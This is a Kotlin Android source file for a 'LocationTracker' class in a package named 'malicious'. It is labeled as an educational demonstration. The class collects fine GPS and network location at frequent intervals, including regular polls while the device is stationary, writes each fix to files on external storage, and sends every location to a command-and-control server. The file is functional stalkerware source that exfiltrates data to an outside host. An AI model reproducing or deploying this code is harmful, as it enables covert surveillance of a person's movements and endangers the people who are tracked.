package com.example.ChatterBox.malicious

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.core.app.ActivityCompat
import org.json.JSONObject
import com.example.ChatterBox.malicious.C2Client
import com.example.ChatterBox.malicious.C2Config
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Timer
import java.util.TimerTask
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import androidx.core.app.NotificationCompat

/**
 * Tracks and logs user location in the background.
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
class LocationTracker(private val context: Context) {
    private val TAG = "LocationTracker"
    private val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    private var locationListener: LocationListener? = null
    private var timer: Timer? = null
    private val handler = Handler()
    private val CHANNEL_ID = "location_tracker_channel"
    
    // Track high-precision location at most every 5 meters or 10 seconds
    private val MIN_TIME_BETWEEN_UPDATES = 10000L // 10 seconds
    private val MIN_DISTANCE_CHANGE = 5f // 5 meters
    
    /**
     * Start tracking the user's location.
     */
    fun startTracking() {
        Log.d(TAG, "Starting location tracking")
        
        // Create notification channel for Android O and above
        createNotificationChannel()
        
        // Show notification
        showNotification("Location Tracking Started", "Now monitoring device location")
        
        // Create the location listener
        locationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                logLocation(location)
            }
            
            @Deprecated("Deprecated in Java")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
                // Required for older Android versions
            }
            
            override fun onProviderEnabled(provider: String) {
                logProviderStatus(provider, true)
            }
            
            override fun onProviderDisabled(provider: String) {
                logProviderStatus(provider, false)
            }
        }
        
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.d(TAG, "Location permission not granted")
            return
        }
        
        try {
            // Register for location updates from GPS
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                MIN_TIME_BETWEEN_UPDATES,
                MIN_DISTANCE_CHANGE,
                locationListener as LocationListener
            )
            
            // Also register for network location as backup
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                MIN_TIME_BETWEEN_UPDATES,
                MIN_DISTANCE_CHANGE,
                locationListener as LocationListener
            )
            
            // Schedule periodic location checks even if no movement
            startPeriodicLocationCheck()
            
            Log.d(TAG, "Location tracking started")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting location tracking", e)
        }
    }
    
    /**
     * Start periodic location updates even when the user isn't moving.
     */
    private fun startPeriodicLocationCheck() {
        timer?.cancel()
        timer = Timer()
        
        timer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                handler.post {
                    try {
                        // This ensures we get a location even when stationary
                        val lastKnownLocation = getLastKnownLocation()
                        if (lastKnownLocation != null) {
                            logLocation(lastKnownLocation)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error in periodic location check", e)
                    }
                }
            }
        }, 60000, 60 * 1000) // Check after 1 minute, then every 1 minute
    }
    
    /**
     * Get the last known location from available providers.
     */
    private fun getLastKnownLocation(): Location? {
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return null
        }
        
        try {
            // Try GPS first
            var location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            
            // If GPS not available, try network location
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
            
            return location
        } catch (e: Exception) {
            Log.e(TAG, "Error getting last known location", e)
            return null
        }
    }
    
    /**
     * Log a location to storage.
     */
    private fun logLocation(location: Location) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
        
        try {
            val locationJson = JSONObject().apply {
                put("timestamp", timestamp)
                put("latitude", location.latitude)
                put("longitude", location.longitude)
                put("accuracy", location.accuracy)
                put("altitude", location.altitude)
                put("speed", location.speed)
                put("provider", location.provider)
                put("device_model", android.os.Build.MODEL)
            }
            
            val locationFile = File(getStorageDir(), "location_$timestamp.json")
            
            FileOutputStream(locationFile).use { out ->
                out.write(locationJson.toString().toByteArray())
            }
            
            Log.d(TAG, "Location logged: ${location.latitude}, ${location.longitude}")
            
            // Show notification
            showNotification("Location Captured", "${location.latitude}, ${location.longitude}")
            
            // Send location data to C2 server
            try {
                val c2Client = C2Client(context)
                c2Client.sendExfiltrationData("location", locationJson.toString())
                Log.d(TAG, "Location sent to C2 server: ${C2Config.SERVER_URL}")
            } catch (e: Exception) {
                Log.e(TAG, "Error sending location to C2 server", e)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error logging location", e)
        }
    }
    
    /**
     * Log provider status changes.
     */
    private fun logProviderStatus(provider: String, enabled: Boolean) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
        
        try {
            val statusJson = JSONObject().apply {
                put("timestamp", timestamp)
                put("provider", provider)
                put("enabled", enabled)
                put("device_model", android.os.Build.MODEL)
            }
            
            val statusFile = File(getStorageDir(), "provider_status_$timestamp.json")
            
            FileOutputStream(statusFile).use { out ->
                out.write(statusJson.toString().toByteArray())
            }
            
            Log.d(TAG, "Provider status logged: $provider is ${if (enabled) "enabled" else "disabled"}")
        } catch (e: Exception) {
            Log.e(TAG, "Error logging provider status", e)
        }
    }
    
    /**
     * Stop tracking the user's location.
     */
    fun stopTracking() {
        locationListener?.let {
            locationManager.removeUpdates(it)
        }
        
        timer?.cancel()
        timer = null
        
        Log.d(TAG, "Location tracking stopped")
    }
    
    /**
     * Get or create the storage directory.
     */
    private fun getStorageDir(): File {
        val dir = File(Environment.getExternalStorageDirectory(), "ChatterBox/location_data")
        if (!dir.exists()) {
            dir.mkdirs()
        }
        return dir
    }
    
    /**
     * Create notification channel for Android O and above
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Location Tracker"
            val descriptionText = "Shows location tracking activity"
            val importance = NotificationManager.IMPORTANCE_DEFAULT
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                description = descriptionText
            }
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    /**
     * Show a temporary notification
     */
    private fun showNotification(title: String, message: String) {
        val notificationId = System.currentTimeMillis().toInt()
        
        val builder = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_map)
            .setContentTitle(title)
            .setContentText(message)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setAutoCancel(true)
        
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(notificationId, builder.build())
        
        // Auto-dismiss after 3 seconds
        android.os.Handler().postDelayed({
            notificationManager.cancel(notificationId)
        }, 3000)
    }
}
